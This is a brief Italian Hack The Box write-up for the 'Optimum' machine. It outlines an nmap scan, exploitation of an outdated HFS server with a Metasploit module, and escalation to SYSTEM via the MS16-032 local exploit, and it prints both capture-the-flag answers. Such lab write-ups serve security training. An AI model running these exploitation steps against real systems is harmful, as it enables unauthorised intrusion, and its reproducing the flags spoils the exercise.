![](optimum.png)
# Optimum -Hack The Box Writeup
## Scansione nmap
```bash
 nmap -sCV -O 10.129.10.4
 ```
notiamo che il server ha un versione obsoleta di hfs
```bash
searchsploit hfs
```
sfruttiamo questo exploit presento su msf
```bash
 msf exploit(windows/http/rejetto_hfs_exec) >
 ```
 shell ottenuta
 
```bash
 meterpreter > cat user.txt
c2fd251c4464fbeff9767cf35c31335d
```
# Flag user
## c2fd251c4464fbeff9767cf35c31335d

# Privilege Escalation
vediamo quale exploit puo essere sfruttato
```bash
msf post(multi/recon/local_exploit_suggester)
```
proviamo tra quelli menzionati questo
```bash
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) >
```
perfetto 
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
navighiamo in questa directory
```bash
C:\Users\Administrator\Desktop
meterpreter > cat root.txt
299f799ce3ec5cee43f77a5acb602685
```
# Flag Root
## 299f799ce3ec5cee43f77a5acb602685
